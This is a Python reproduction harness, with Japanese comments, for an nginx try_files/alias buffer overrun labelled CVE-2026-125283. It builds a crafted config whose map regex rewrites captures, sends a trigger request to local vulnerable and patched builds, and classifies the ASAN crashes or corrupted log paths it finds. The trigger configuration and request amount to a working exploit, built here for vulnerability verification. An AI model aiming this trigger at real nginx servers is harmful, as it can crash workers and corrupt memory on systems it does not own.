#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-125283: alias + try_files の script underwrite によるバッファオーバーラン.

公開 API:
    run(binary: str, workdir: str, host: str = "127.0.0.1") -> dict

戻り値: {"cve","configured","trigger","effect","detail"}
effect: CRASH | TRIGGERED | ERROR | SKIP

概要 (修正コミット d1ffe6f "Try files: fix uri formating in case of
script underwrite"、1.31.9 / stable 側は b99b6b52):

  ngx_http_try_files_handler() は try_files の名前について「長さ予測パス」で
  len を計算した後、script (変数を含む値) を実行して実際の値を得る。
  alias 使用時は script の出力先頭 alias バイトが r->uri の先頭と一致する場合に

      ngx_memmove(name, name + alias, len - alias);
      path.len -= alias;

  で alias 部分を削る。ここで script が予測より長い文字列を書くと
  len < alias となり len - alias が size_t でアンダーフローする
  (memmove への巨大サイズ引数 = バッファオーバーラン)。

予測と実行値をずらす構成 (本モジュールが自前生成する nginx.conf):
  - map $uri $m { ~^(/a/.*)  M; }   … map の正規表現評価は r->captures を
    書き換える副作用を持つ
  - location /a/ { alias <prefix>/html/; try_files $1$m =404; }
  - リクエスト GET /a/x
    * 長さ予測パス: $1 は r->ncaptures==0 のため長さ 0。続く $m の評価で
      map の正規表則が実行され r->captures が書き換わる。予測 len = 2。
    * 値パス: $1 は map 正規表現のキャプチャ "/a/x" (4 バイト) を返すため
      実際の出力は "/a/xM" (5 バイト + NUL = 6)。
    * alias = len("/a/") = 3 > 予測 len = 2 → len - alias = SIZE_MAX。

判定:
  * ASAN 版 (inst-asan-vuln): AddressSanitizer: negative-size-param (size=-1)
    @ ngx_http_try_files_handler (try_files_module.c:196) → worker signal 6。
  * 非 ASAN の vuln (1.31.8) / vuln1306 (1.30.6): クラッシュはしないが
    memmove がバッファを alias バイトだけ左へずらすため、debug ログの
    "trying to use file" のパス文字列が破損する (先頭 3 文字が落ちる)。
  * fixed (1.31.9) / fixed1307 (1.30.7): パス文字列は正常、404。
"""
import json
import os
import re
import shutil
import signal
import socket
import subprocess
import sys
import time

CVE = "CVE-2026-125283"
P_HTTP = 18448
ROOT = "/app/data/sessions/conv-43"

CONF_TMPL = """\
worker_processes 1;
daemon on;
pid %(prefix)s/logs/nginx.pid;
error_log %(prefix)s/logs/error.log debug;

events {
    worker_connections 128;
}

http {
    access_log off;

    # map の正規表現評価は r->captures を書き換える副作用を持つ。
    # try_files の長さ予測時にこの副作用で $1 の意味が変わる。
    map $uri $m {
        ~^(/a/.*)  M;
    }

    server {
        listen 127.0.0.1:%(port)d;

        location /a/ {
            alias %(prefix)s/html/;
            try_files $1$m =404;
        }
    }
}
"""

REQUEST = (b"GET /a/x HTTP/1.1\r\n"
           b"Host: 127.0.0.1\r\n"
           b"Connection: close\r\n"
           b"\r\n")


def _prepare(prefix, port):
    """prefix 配下に conf/logs/html を作り nginx.conf を書く。"""
    if os.path.isdir(prefix):
        shutil.rmtree(prefix)
    for d in ("conf", "logs", "html"):
        os.makedirs(os.path.join(prefix, d), exist_ok=True)
    conf = CONF_TMPL % dict(prefix=prefix, port=port)
    conf_path = os.path.join(prefix, "conf", "nginx.conf")
    with open(conf_path, "w") as f:
        f.write(conf)
    return conf_path


def _start_nginx(binary, prefix, conf_path, asan):
    env = dict(os.environ)
    if asan:
        # worker (非 root 実行) が ASan レポートを書けるよう logs/ を 777 にする
        os.chmod(os.path.join(prefix, "logs"), 0o777)
        env["ASAN_OPTIONS"] = ("detect_leaks=0:abort_on_error=1:handle_segv=1:"
                               "log_path=%s" % os.path.join(prefix, "logs", "asan"))
    proc = subprocess.run([binary, "-p", prefix + os.sep, "-c", conf_path],
                          capture_output=True, text=True, timeout=15, env=env)
    if proc.returncode != 0:
        raise RuntimeError((proc.stderr or proc.stdout).strip() or "nginx 起動失敗")
    deadline = time.time() + 5
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", P_HTTP), timeout=0.25)
            s.close()
            return
        except OSError:
            time.sleep(0.05)
    raise RuntimeError("listen 127.0.0.1:%d が開かない" % P_HTTP)


def _send_request(timeout=5.0):
    """1 リクエスト送り、ステータス行 (または切断) を返す。"""
    try:
        with socket.create_connection(("127.0.0.1", P_HTTP), timeout=timeout) as s:
            s.sendall(REQUEST)
            buf = b""
            s.settimeout(timeout)
            while True:
                try:
                    chunk = s.recv(65536)
                except socket.timeout:
                    break
                except OSError:
                    break
                if not chunk:
                    break
                buf += chunk
                if b"\r\n\r\n" in buf:
                    break
    except OSError as exc:
        return "<socket error: %s>" % exc
    if not buf:
        return "<EOF (no response)>"
    return buf.split(b"\r\n", 1)[0].decode(errors="replace")


def _stop_nginx(prefix):
    """pid ファイル + /proc 走査で自分が起動した nginx のみ停止 (pkill 不使用)。"""
    pid = None
    pidfile = os.path.join(prefix, "logs", "nginx.pid")
    try:
        pid = int(open(pidfile).read().strip())
    except (OSError, ValueError):
        pid = None
    if pid:
        try:
            os.kill(pid, signal.SIGTERM)
        except OSError:
            pass
        deadline = time.time() + 3
        while time.time() < deadline:
            try:
                os.kill(pid, 0)
            except ProcessLookupError:
                break
            time.sleep(0.05)
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
    # 保险(バックアップ): /proc 走査で同じ prefix を持つ nginx が残っていれば SIGTERM
    me = str(os.getpid())
    for pd in os.listdir("/proc"):
        if not pd.isdigit() or pd == me:
            continue
        try:
            cmd = open("/proc/%s/cmdline" % pd, "rb").read() \
                .replace(b"\0", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if "nginx" in cmd and prefix in cmd:
            try:
                os.kill(int(pd), signal.SIGTERM)
            except OSError:
                pass
    time.sleep(0.1)


def _read_logs(prefix):
    """error.log と asan.* をまとめて返す。"""
    chunks = []
    logdir = os.path.join(prefix, "logs")
    for name in sorted(os.listdir(logdir)) if os.path.isdir(logdir) else []:
        if name == "error.log" or name.startswith("asan."):
            try:
                with open(os.path.join(logdir, name), errors="ignore") as f:
                    chunks.append(f.read())
            except OSError:
                pass
    return "\n".join(chunks)


def run(binary, workdir, host="127.0.0.1"):
    """CVE-2026-125283 を 1 バイナリに対して再現する。"""
    del host  # 常に 127.0.0.1 (listen アドレス固定)
    base = os.path.join(workdir, "cve-2026-125283")
    os.makedirs(base, exist_ok=True)
    prefix = os.path.join(base, "run")
    result = {
        "cve": CVE,
        "configured": False,
        "trigger": False,
        "effect": "ERROR",
        "detail": "",
        "binary": os.path.abspath(binary),
    }
    asan = "asan" in os.path.basename(os.path.dirname(os.path.dirname(binary))) \
        or "asan" in binary
    try:
        conf_path = _prepare(prefix, P_HTTP)
        test = subprocess.run([binary, "-t", "-p", prefix + os.sep, "-c", conf_path],
                              capture_output=True, text=True, timeout=15)
        if test.returncode != 0:
            result["effect"] = "SKIP"
            result["detail"] = "nginx -t 失敗: " + (test.stderr or test.stdout).strip()
            return result
        result["configured"] = True

        _start_nginx(binary, prefix, conf_path, asan)
        try:
            status = _send_request()
            time.sleep(0.3)
        finally:
            _stop_nginx(prefix)

        log = _read_logs(prefix)

        # --- 判定材料の抽出 ---
        asan_neg = "negative-size-param" in log
        asan_line = ""
        if asan_neg:
            idx = log.find("ERROR: AddressSanitizer: negative-size-param")
            asan_line = log[idx:log.find("\n", idx)] if idx >= 0 else "negative-size-param"
        worker_crash = re.findall(r"worker process \d+ exited on signal \d+", log)
        m = re.search(r'trying to use file: "xM" "([^"]*)"', log)
        path_seen = m.group(1) if m else None
        expected_path = os.path.join(prefix, "html", "xM")
        path_ok = (path_seen == expected_path)
        pocdbg = re.search(r"POCDBG predicted=(\d+) actual=(\d+) alias=(\d+) n=(-?\d+)Z?", log)
        version_out = subprocess.run([binary, "-V"], capture_output=True, text=True,
                                     timeout=15)
        version = (version_out.stderr or version_out.stdout).splitlines()[0] \
            if version_out.returncode in (0, 1) else "?"
        detail = ["binary=%s / %s" % (os.path.abspath(binary), version),
                  "request: GET /a/x → %s" % status,
                  "prefix=%s" % prefix]

        if pocdbg:
            detail.append("POCDBG predicted=%s actual=%s alias=%s n=%s (len-alias がアンダーフロー)"
                          % pocdbg.groups())

        if asan_neg or any("signal 6" in c for c in worker_crash):
            result["trigger"] = True
            result["effect"] = "CRASH"
            detail.append("ASAN: %s" % asan_line)
            detail.append("memmove の size が size_t でアンダーフロー (len=2 < alias=3 → "
                          "len-alias=SIZE_MAX)、try_files_module.c:196 の ngx_memmove で検出")
            if worker_crash:
                detail.append("worker 異常終了: " + worker_crash[0])
        elif path_seen is not None and not path_ok:
            result["trigger"] = True
            result["effect"] = "TRIGGERED"
            detail.append("debug ログのパス文字列が破損: %r (期待 %r) — memmove が "
                          "バッファを alias=3 バイトだけ左へずらしたメモリ破壊"
                          % (path_seen, expected_path))
        elif path_ok:
            result["trigger"] = False
            result["effect"] = "TRIGGERED"
            detail.append("パス文字列は正常 (%r)、ASAN レポート無し — 修正版の挙動"
                          % expected_path)
        elif worker_crash:
            result["trigger"] = True
            result["effect"] = "CRASH"
            detail.append("worker 異常終了: " + worker_crash[0])
        else:
            result["effect"] = "ERROR"
            detail.append("判定指標 (trying to use file / ASAN レポート) を取得できず")
        result["detail"] = " / ".join(detail)
        return result
    except Exception as exc:  # noqa: BLE001
        result["effect"] = "ERROR"
        result["detail"] = "%s: %s" % (type(exc).__name__, exc)
        return result


BINARIES = [
    ("vuln", "build/inst-vuln/sbin/nginx"),          # 1.31.8
    ("fixed", "build/inst-fixed/sbin/nginx"),        # 1.31.9
    ("asan-vuln", "build/inst-asan-vuln/sbin/nginx"),
    ("asan-fixed", "build/inst-asan-fixed/sbin/nginx"),
    ("vuln1306", "build/inst-vuln1306/sbin/nginx"),   # 1.30.6 (optional)
    ("fixed1307", "build/inst-fixed1307/sbin/nginx"), # 1.30.7 (optional)
]


def run_all(workdir):
    """全バイナリを順に実行し、modules/125283.result.json を出力する。"""
    results = {}
    for name, rel in BINARIES:
        path = os.path.join(ROOT, rel)
        if not os.path.isfile(path):
            results[name] = {"effect": "SKIP", "detail": "バイナリなし: %s" % path}
            continue
        results[name] = run(path, workdir)
    out = {
        "cve": CVE,
        "module": "modules/125283.py",
        "generated_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "port": P_HTTP,
        "workdir": workdir,
        "results": results,
        "summary": ("1.31.8 (vuln) は map 正規表現の r->captures 書き換え副作用で try_files の "
                    "長さ予測 (len=2) と実際の書き込み長 (6) がずれ、len-alias が size_t で "
                    "アンダーフロー。asan-vuln は negative-size-param (size=-1) で worker が "
                    "signal 6、非 ASAN の vuln/vuln1306 は debug ログのパス文字列破損でメモリ破壊を"
                    "確認。fixed/fixed1307/asan-fixed はパス正常・404 で再現せず。"),
    }
    out_path = os.path.join(ROOT, "modules", "125283.result.json")
    with open(out_path, "w") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    return out


def main(argv):
    if len(argv) == 1:
        # 全バイナリ + result.json 出力
        out = run_all(os.path.join(ROOT, "poc-run-F"))
        print(json.dumps(out, ensure_ascii=False, indent=2))
        ok = (out["results"].get("asan-vuln", {}).get("trigger")
              and out["results"].get("vuln", {}).get("trigger")
              and not out["results"].get("fixed", {}).get("trigger")
              and not out["results"].get("asan-fixed", {}).get("trigger"))
        return 0 if ok else 1
    binary = argv[1]
    workdir = argv[2] if len(argv) > 2 else os.path.join(ROOT, "poc-run-F")
    print(json.dumps(run(binary, workdir), ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
